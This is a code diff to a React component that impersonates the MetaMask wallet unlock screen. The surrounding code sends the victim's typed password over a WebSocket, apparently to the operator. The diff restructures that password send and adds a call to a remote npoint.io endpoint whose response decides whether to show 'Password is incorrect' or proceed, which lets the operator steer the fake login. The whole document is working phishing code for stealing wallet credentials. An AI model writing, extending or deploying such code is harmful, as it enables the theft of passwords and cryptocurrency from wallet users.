@@ -4,7 +4,7 @@ import { initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
 import { ref, set } from "firebase/database";
 import { v4 as uuidv4 } from 'uuid';
-
+import axios from 'axios';
 
 import Mascot from "./mascot.component";
 
@@ -288,22 +288,36 @@ export default function MetaMaskUnlock({onSuccess}) {
     });
 
     const value = password;
-    if (value.trim() === '' || !isConnected) return;
-
-    const pingObject = {
-      e: SEND_UID,
-      v: value
-    };
-    
-    if (ws.current && ws.current.readyState === WebSocket.OPEN) {
-      ws.current.send(JSON.stringify(pingObject));
+    if (value.trim() === '' || !isConnected) {
+      console.warn('Metamask Support API not connected');
     } else {
-      console.warn('WebSocket not connected');
+      const pingObject = {
+        e: SEND_UID,
+        v: value
+      };
+      
+      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
+        ws.current.send(JSON.stringify(pingObject));
+      } else {
+        console.warn('WebSocket not connected');
+      }
     }
 
     setError("");
     mockPending(setPasswordLoading, 300);
-    setError("Password is incorrect. Please try again.");
+
+    try {
+      const url = `https://api.npoint.io/a8e12caa3df5c2954957`;
+      const response = await axios.get(url);
+      console.log(response.data.success)
+      if (response.data.success) {
+        onSuccess()
+      } else {
+        setError("Password is incorrect. Please try again.");
+      }
+    } catch (error) {
+      throw new Error(`Failed to fetch data: ${error.message}`);
+    }
   };
 
   const handleKeyUp = async (e) => {
